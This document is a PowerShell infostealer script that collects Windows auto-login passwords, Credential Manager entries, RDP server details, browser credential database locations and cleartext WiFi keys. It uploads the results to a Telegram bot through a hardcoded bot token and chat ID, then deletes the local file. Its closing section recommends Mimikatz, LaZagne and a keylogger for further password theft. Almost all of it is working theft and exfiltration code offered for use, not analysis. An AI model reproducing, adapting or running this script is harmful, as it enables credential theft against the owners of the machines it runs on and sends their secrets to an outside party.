# Capture actual login credentials from Windows Credential Manager and memory
$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

$output = @()
$output += "=== CREDENTIAL EXTRACTION ==="
$output += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$output += "Computer: $env:COMPUTERNAME"
$output += "User: $env:USERNAME"
$output += ""

# 1. Registry auto-login
$output += "=== REGISTRY AUTO-LOGIN ==="
try {
    $winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $autoLogin = Get-ItemProperty -Path $winlogon -ErrorAction SilentlyContinue
    if ($autoLogin.AutoAdminLogon -eq "1") {
        $output += "Username: $($autoLogin.DefaultUsername)"
        $output += "Password: $($autoLogin.DefaultPassword)"
    } else {
        $output += "Not configured"
    }
} catch {
    $output += "Unable to read"
}
$output += ""

# 2. Windows Credential Manager (stored credentials)
$output += "=== WINDOWS CREDENTIAL MANAGER ==="
try {
    $creds = cmdkey /list
    $output += $creds -join "`n"
} catch {
    $output += "Unable to read"
}
$output += ""

# 3. SAM Database location (for reference)
$output += "=== SAM DATABASE INFO ==="
$output += "SAM File: C:\Windows\System32\config\SAM"
$output += "SYSTEM File: C:\Windows\System32\config\SYSTEM"
$output += "Note: These files contain password hashes (requires offline tools to extract)"
$output += ""

# 4. LSA Secrets (where passwords are cached)
$output += "=== LSA CACHED CREDENTIALS ==="
try {
    # Check if we can access LSA
    $lsaKey = "HKLM:\SECURITY\Policy\Secrets"
    if (Test-Path $lsaKey) {
        $output += "LSA Secrets accessible: YES"
        $output += "Note: Contains cached domain credentials and auto-login passwords"
    } else {
        $output += "LSA Secrets accessible: NO (requires SYSTEM privileges)"
    }
} catch {
    $output += "Unable to access LSA"
}
$output += ""

# 5. Check current user's credential
$output += "=== CURRENT USER INFO ==="
$output += "Logged in as: $env:USERNAME"
$output += "User Profile: $env:USERPROFILE"
$output += "User SID: $((New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value)"
$output += ""

# 6. RDP saved credentials
$output += "=== RDP SAVED CREDENTIALS ==="
try {
    $rdpFiles = Get-ChildItem "$env:USERPROFILE\Documents\*.rdp" -ErrorAction SilentlyContinue
    if ($rdpFiles) {
        foreach ($file in $rdpFiles) {
            $content = Get-Content $file.FullName
            $server = ($content | Select-String "full address:s:").ToString() -replace "full address:s:",""
            $username = ($content | Select-String "username:s:").ToString() -replace "username:s:",""
            $output += "File: $($file.Name)"
            $output += "  Server: $server"
            $output += "  Username: $username"
        }
    } else {
        $output += "No RDP files found"
    }
} catch {
    $output += "Unable to read RDP files"
}
$output += ""

# 7. Browser credential database locations
$output += "=== BROWSER CREDENTIAL DATABASES ==="
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
if (Test-Path $chromePath) { $output += "Chrome: EXISTS at $chromePath" }
if (Test-Path $edgePath) { $output += "Edge: EXISTS at $edgePath" }
$output += ""

# 8. WiFi passwords
$output += "=== WIFI PASSWORDS ==="
try {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[-1].Trim()
    }
    foreach ($wifiProfile in $wifiProfiles) {
        $passInfo = netsh wlan show profile name="$wifiProfile" key=clear
        $wifiPassword = ($passInfo | Select-String "Key Content") -replace ".*: ",""
        if ($wifiPassword) {
            $output += "SSID: $wifiProfile"
            $output += "  Password: $wifiPassword"
        }
    }
} catch {
    $output += "No WiFi profiles or unable to extract"
}
$output += ""

$output += "=== RECOMMENDATION ==="
$output += "For actual password extraction:"
$output += "1. Use Mimikatz (requires admin/SYSTEM)"
$output += "2. Use LaZagne (python-based credential dumper)"
$output += "3. Capture at login using keylogger"

# Save and send
$outFile = "$env:TEMP\creds-detailed-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
$output | Out-File -FilePath $outFile -Encoding UTF8

# Send to Telegram
Add-Type -AssemblyName System.Net.Http
$httpClient = New-Object System.Net.Http.HttpClient
$form = New-Object System.Net.Http.MultipartFormDataContent
$form.Add((New-Object System.Net.Http.StringContent($TelegramChatId)), "chat_id")
$form.Add((New-Object System.Net.Http.StringContent("Detailed Credentials - $env:COMPUTERNAME")), "caption")
$fileStream = [System.IO.File]::OpenRead($outFile)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$form.Add($fileContent, "document", [System.IO.Path]::GetFileName($outFile))

try {
    $response = $httpClient.PostAsync("https://api.telegram.org/bot$TelegramBotToken/sendDocument", $form).Result
} catch {}

if ($fileStream) { $fileStream.Dispose() }
if ($httpClient) { $httpClient.Dispose() }
Remove-Item $outFile -Force -ErrorAction SilentlyContinue
